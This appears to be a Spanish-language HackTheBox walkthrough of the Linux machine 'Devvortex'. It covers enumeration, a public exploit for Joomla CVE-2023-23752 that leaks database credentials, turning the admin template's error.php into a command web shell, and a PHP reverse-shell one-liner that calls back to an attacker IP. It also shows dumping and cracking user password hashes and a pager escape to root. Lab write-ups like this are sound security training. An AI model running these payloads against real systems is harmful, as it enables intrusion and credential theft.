---
layout: post
title: Devvortex
date: 2023-12-04 13:09 +0100
img_path: /assets/img/
categories: [HackTheBox,Easy] 
tags: [Joomla,Virtual Hosting,RCE]
---

![Devvortex](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Devvortex.png)

Devvortex es una máquina Linux con la que practicaremos enumeración web y virtual hosting. Al utilizar Joomla, practicaremos cómo podemos obtener ejecución remota de comandos una vez que accedemos al panel de administración. También se hace uso de la vulnerabilidad CVE-2023-23752 para obtener información sensible, como usuarios y contraseñas.

## 🔍 **ENUMERACIÓN**

Realizamos un nmap para conocer todos los puertos abiertos de la máquina.

```
nmap -p- -open -sS --min-rate 5000 -n -vvv -Pn 10.129.54.199 -oG allPorts
```

Una vez finalizado el escaneo, observamos que los únicos puertos abiertos son el 22 y el 80.

![Pasted image 20231202182800.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231202182800.png)

A continuación, realizamos un escaneo más exhaustivo de dichos puertos para conocer la versión y servicio que utilizan. Observamos que el puerto 80 redirige a la dirección `[http://devvortex.htb](http://devvortex.htb)`, así que lo añadimos al archivo `/etc/hosts`

![Pasted image 20231202182158.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231202182158.png)

```
nmap -p22,80 -sCV 10.129.54.199 -oN targeted
```

![Pasted image 20231202182309.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231202182309.png)

### Puerto 80

![Pasted image 20231203131930.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231203131930.png)

Comenzamos analizando las tecnologías que utiliza con la herramienta `whatweb`.

![Pasted image 20231203133456.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231203133456.png)

Observamos que utiliza `nginx 1.18.0`, pero no encontramos ninguna vulnerabilidad. Realizamos un escaneo de directorios con la herramienta `gobuster`.

```
gobuster dir -u http://devvortex.htb/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -o devvortex.htb.dirs -f
```

![Pasted image 20231203133401.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231203133401.png)

No encontramos nada interesante, así que probamos a ver si utiliza *virtual hosting.* Para ello, utilizamos `gobuster`.

```
gobuster vhost --append-domain -u http://devvortex.htb/ -t 50 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o devvortex.vhosts
```

![Pasted image 20231203133909.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231203133909.png)

Encontramos un subdominio: `dev.devvortex.htb`. Para poder acceder a él, lo añadimos al archivo `/etc/hosts`.

![Pasted image 20231203175102.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231203175102.png)

### dev.devvortex.htb

![Pasted image 20231203134046.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231203134046.png)

Realizamos un escaneo de directorios del nuevo subdominio con `gobuster`.

```
gobuster dir -u http://dev.devvortex.htb/ -f -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 200 -o dev.devvortex.htb.dirs
```

![Pasted image 20231203135832.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231203135832.png)

Encontramos un directorio interesante: `/administrator/`. Si accedemos a él, podemos observar que se trata de un panel de autenticación de `joomla`. 

![Pasted image 20231203135901.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231203135901.png)

Podemos utilizar la herramienta `joomscan` para poder saber más.

```
joomscan -u http://dev.devvortex.htb
```

![Pasted image 20231203143507.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231203143507.png)

Gracias a `joomscan`, obtenemos que la versión utilizada de `joomla` es la `4.2.6`. Buscando por internet, encontramos que puede ser vulnerable a ***CVE-2023-23752.***

## 💥 **EXPLOTACIÓN**

[https://github.com/Ly0kha/Joomla-CVE-2023-23752-Exploit-Script](https://github.com/Ly0kha/Joomla-CVE-2023-23752-Exploit-Script)

Utilizando el siguiente exploit, podemos extraer información valiosa de la base de datos utilizada por `joomla`.

![Pasted image 20231203144317.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231203144317.png)

Observamos que tenemos dos usuarios: **lewis** y **logan**. Además, tenemos la contraseña de lewis: `P4ntherg0t1n5r3c0n##`. Si probamos a utilizar las credenciales a través de SSH, no vamos a tener exito, pero podemos acceder a través del panel de autenticación de `joomla`.

![Pasted image 20231203144756.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231203144756.png)

Una vez que tenemos acceso al panel de administración, podemos obtener un **RCE** para utilizar una reverse shell. Para ello nos dirigimos a la pestaña system, Administrator Templates, seleccionamos la template atum, y editamos el archivo `error.php`.

![Pasted image 20231203162659.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231203162659.png)

Si accedemos desde el navegador, podemos ejecutar comandos.

```
http://dev.devvortex.htb/administrator/templates/atum/error.php?cmd=id
```

![Pasted image 20231203162950.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231203162950.png)

Para conseguir enviarnos una reverse shell a través del **RCE**, utilizamos el siguiente **payload**.

```php
php -r '$sock=fsockopen("10.10.16.24",443);exec("sh <&3 >&3 2>&3");'
```

Nos ponemos en escucha con `netcat` para recibir la reverse shell.

![Pasted image 20231203163410.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231203163410.png)

Una vez dentro, el único usuario disponible es **logan**, pero no tenemos las credenciales para poder conectarnos. Como anteriormente obtuvimos las credenciales de la base de datos de `joomla`, podemos utilizarlas para obtener las credenciales de **logan**.

```
mysql -u lewis -pP4ntherg0t1n5r3c0n##
use joomla;
select username,password from sd4fg_users;
```

![Pasted image 20231203165325.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231203165325.png)

Guardamos la clave encriptada de logan para poder crackearla con john.

![Pasted image 20231203165304.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231203165304.png)

Una vez obtenida la contraseña de logan, podemos conectarnos a través de ssh.

![Pasted image 20231203165429.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231203165429.png)

Una vez dentro, ya podemos ver la flag de `user.txt`. que está situada en `/home/logan/user.txt`.

## 🔐 **ESCALADA DE PRIVILEGIOS**

Si realizamos un `sudo -l` para ver los commandos que podemos ejecutar como `root` nos encontramos lo siguiente.

![Pasted image 20231203172027.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231203172027.png)

Si lo ejecutamos para ver algún crasheo que se haya producido, podemos elevar privilegios, ya que para mostrar el reporte utiliza una funcionalidad de pager como `less`.

![Pasted image 20231203172109.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231203172109.png)

Seleccionamos la opción V para ver el reporte y cuando nos muestre el reporte ejecutamos `!bash` y obtendremos una shell como `root`.

![Pasted image 20231203172221.png](Devvortex%20120599f1e39f4440af1b0a954204bc5d/Pasted_image_20231203172221.png)

Una vez que tenemos acceso como `root`, podemos obtener la flag en `/root/root.txt`.